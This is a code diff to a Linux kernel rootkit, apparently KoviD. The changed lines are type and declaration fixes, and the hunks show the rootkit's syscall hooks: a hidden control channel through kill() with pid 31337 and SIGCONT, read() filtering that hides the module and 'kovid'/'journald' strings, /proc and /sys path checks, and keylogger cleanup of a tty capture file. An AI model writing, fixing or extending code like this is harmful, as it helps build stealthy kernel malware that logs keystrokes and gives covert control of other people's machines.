@@ -33,7 +33,7 @@ sys64 real_m_bpf;
 sys64 real_m_read;
 
 #define PT_REGS_PARM1(x) ((x)->di)
-#define PT_REGS_PARM2(x) ((x)->si)
+#define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
 #define PT_REGS_PARM3(x) ((x)->dx)
 #define PT_REGS_PARM4(x) ((x)->cx)
 #define PT_REGS_PARM5(x) ((x)->r8)
@@ -134,7 +134,7 @@ m_clone:
 static asmlinkage long m_kill(struct pt_regs *regs)
 {
     pid_t pid = (pid_t)PT_REGS_PARM1(regs);
-    int sig = (int)PT_REGS_PARM2(regs);
+    unsigned long sig = (unsigned long)PT_REGS_PARM2(regs);
 
     /** Open/Close commands interface */
     if (31337 == pid && SIGCONT == sig) {
@@ -182,7 +182,7 @@ leave:
 static bool is_sys_parent(unsigned int fd) {
     struct dentry *dentry;
     struct dentry *parent_dentry;
-    char *path_buffer;
+    char *path_buffer, *parent_path;
     bool rv = false;
 
     struct fd f = fdget(fd);
@@ -198,7 +198,7 @@ static bool is_sys_parent(unsigned int fd) {
         goto out;
     }
 
-    char *parent_path = d_path(&f.file->f_path, path_buffer, PAGE_SIZE);
+    parent_path = d_path(&f.file->f_path, path_buffer, PAGE_SIZE);
     if (!IS_ERR(parent_path)) {
         if (!strncmp(parent_path, "/proc", 5) ||
                 !strncmp(parent_path, "/sys",4) ||
@@ -295,8 +295,8 @@ static asmlinkage long m_read(struct pt_regs *regs) {
 
     arg = (const char __user*)PT_REGS_PARM2(regs);
     if (!copy_from_user((void *)buf, (void *)arg, size)) {
-        char *dest = (strstr(buf, MODNAME) || strstr(buf, "kovid") ||
-                strstr(buf, "journald"));
+        int dest = ((strstr(buf, MODNAME) || strstr(buf, "kovid") ||
+                strstr(buf, "journald")));
         if (!dest)
             goto out;
 
@@ -868,8 +868,6 @@ static void _keylog_cleanup_list(void) {
 }
 
 void _keylog_cleanup(void) {
-    char *tty;
-
     _keylog_cleanup_list();
     fs_kernel_close_file(ttyfilp);
     fs_file_rm(sys_get_ttyfile());
